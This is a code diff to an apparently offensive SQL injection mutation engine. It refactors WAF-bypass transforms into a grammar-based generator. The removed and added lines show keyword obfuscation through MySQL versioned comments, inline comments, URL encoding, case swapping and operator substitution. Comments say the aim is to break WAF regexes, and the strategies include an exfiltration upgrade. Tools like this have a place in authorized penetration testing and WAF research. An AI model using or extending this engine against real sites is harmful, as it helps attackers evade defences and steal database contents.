@@ -1,9 +1,11 @@
 import random
 import re
+from core.grammar_engine import GrammarEngine
 
 class ASTMutator:
     def __init__(self, context="GENERIC", quoteless=False, disable_strings=True):
         self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION"]
+        self.grammar = GrammarEngine()
         self.context = context
         self.quoteless = quoteless
         self.disable_strings = disable_strings
@@ -20,7 +22,8 @@ class ASTMutator:
             "nested_encoding": self._nested_encoding,
             "dynamic_structural": self._dynamic_structural_mutation,
             "upgrade_to_exfil": self._upgrade_to_exfil,
-            "semantic_mutation": self._semantic_symbol_mutation
+            "semantic_mutation": self._semantic_symbol_mutation,
+            "grammar_expansion": self._grammar_expansion
         }
         # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -54,7 +57,7 @@ class ASTMutator:
         clean = re.sub(r"(--\s*-?|#|/\*|;%00).*$", "", clean).strip()
         return clean
 
-    def mutate(self, payload, error_msg=None, intensity=1):
+    def mutate(self, payload, error_msg=None, intensity=1, wrap=True):
         # Isolation Stage: Separate the Wrapper from the Core Logic
         core_gene = self._strip_wrappers(str(payload))
         mutated = core_gene
@@ -87,8 +90,9 @@ class ASTMutator:
                 continue
             mutated = self.strategies[strat_name](mutated)
             
-        # 3. Contextual Compatibility Logic: Wrap the core safely (strictly once at the end)
-        mutated = self._context_aware_wrap(mutated)
+        # 3. Contextual Compatibility Logic: Wrap the core safely
+        if wrap:
+            mutated = self._context_aware_wrap(mutated)
         return mutated
 
     def report_success(self, payload, score):
@@ -123,23 +127,18 @@ class ASTMutator:
                 self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0
 
     def _directed_keyword_mutation(self, payload):
-        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
+        """Directed Mutations: Apply BNF grammar expansions to Keywords."""
         mutated = payload
-        # Find keywords with low reputation in the current payload
         for kw, rep in self.keyword_reputation.items():
-            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.3):
-                # Apply a bypass transformation
-                bypasses = [
-                    lambda k: f"{k[:len(k)//2]}/*{random.randint(100, 9999)}*/{k[len(k)//2:]}",
-                    lambda k: f"/*!{random.randint(0, 99999)}{k}*/",
-                    lambda k: "&&" if k == "AND" else ("||" if k == "OR" else k),
-                    lambda k: "".join([f"%{ord(c):02x}" if random.random() < 0.4 else c for c in k]),
-                    lambda k: f"({k})" if k in ["SELECT", "UNION", "AND", "OR", "XOR"] else k,
-                    lambda k: "".join([c.swapcase() if random.random() < 0.5 else c for c in k])
-                ]
-                transform = random.choice(bypasses)
-                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
+            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.4):
+                # Use the BNF Grammar Engine for the gene expansion
+                expansion = self.grammar.expand(kw, intensity=2)
+                mutated = re.sub(rf'\b{kw}\b', expansion, mutated, flags=re.IGNORECASE)
         return mutated
+
+    def _grammar_expansion(self, payload):
+        """Applies the Custom Grammar Engine (BNF) to the entire payload structure."""
+        return self.grammar.obfuscate_query(payload, intensity=2)
 
     def _apply_error_feedback(self, payload, error):
         """Applies specific mutations based on SQL error messages."""
@@ -376,15 +375,13 @@ class ASTMutator:
             # Semantic Mutation Logic powered by Human-Like Context Awareness
             
             # --- 1. Role-based Logic ---
-            if role == 'LOGICAL_JUNCTION' and random.random() < 0.4:
-                # E.g. 'AND' can be swapped safely to '&&'. Because we KNOW it's a bridge, not a column name.
-                if val.upper() == 'AND': val = '&&'
-                elif val.upper() == 'OR': val = '||'
+            if role == 'LOGICAL_JUNCTION' and random.random() < 0.5:
+                val = self.grammar.expand(val.upper(), intensity=2)
                 
             elif role == 'FUNCTION_CALL' and random.random() < 0.4:
-                # If we know it's a function call (next token is parenthesis), 
-                # we can insert spaces/comments before the bracket safely in MySQL to break WAF regexes.
-                val = f"{val} /*!*/"
+                # Insert spaces/comments before parenthesis safely
+                sep = self.grammar.expand("WHITESPACE", intensity=2)
+                val = f"{val}{sep}"
                 
             elif role == 'TABLE_NAME' and random.random() < 0.3:
                 # Table names can be safely backticked or combined with database name (schema bypass)
@@ -397,17 +394,13 @@ class ASTMutator:
                     val = f"`{val}`"
             
             # --- 2. Type-based Fallback Logic ---
-            if t_type == 'OPERATOR' and val in semantic_dict["OPERATORS"]:
+            if t_type == 'OPERATOR':
                 if random.random() < 0.3:
-                    val = random.choice(semantic_dict["OPERATORS"][val])
+                    val = self.grammar.expand("EQUALS" if val == "=" else val, intensity=2)
                     
             elif t_type == 'KEYWORD' and role not in ['LOGICAL_JUNCTION', 'FUNCTION_CALL']:
-                upper_val = val.upper()
-                if upper_val in semantic_dict["LOGICAL_FUNCTIONS"] and random.random() < 0.4:
-                    val = random.choice(semantic_dict["LOGICAL_FUNCTIONS"][upper_val])
-                elif random.random() < 0.6:
-                    ver = random.choice(["10000", "50000", "50100", "50500", "50700", "00000"])
-                    val = f"/*!{ver}{val}*/"
+                if random.random() < 0.6:
+                    val = self.grammar.expand(val.upper(), intensity=2)
                     
             elif t_type == 'STRING' and role == 'LITERAL_VALUE':
                 inside = val[1:-1]
@@ -436,11 +429,8 @@ class ASTMutator:
                     val = f"`{val}`"
 
             elif t_type == 'WHITESPACE':
-                coin = random.random()
-                if coin < 0.2:
-                    val = "/**/"
-                elif coin < 0.3:
-                    val = "%0a"  
+                if random.random() < 0.5:
+                    val = self.grammar.expand("WHITESPACE", intensity=2)
                     
             return val
         
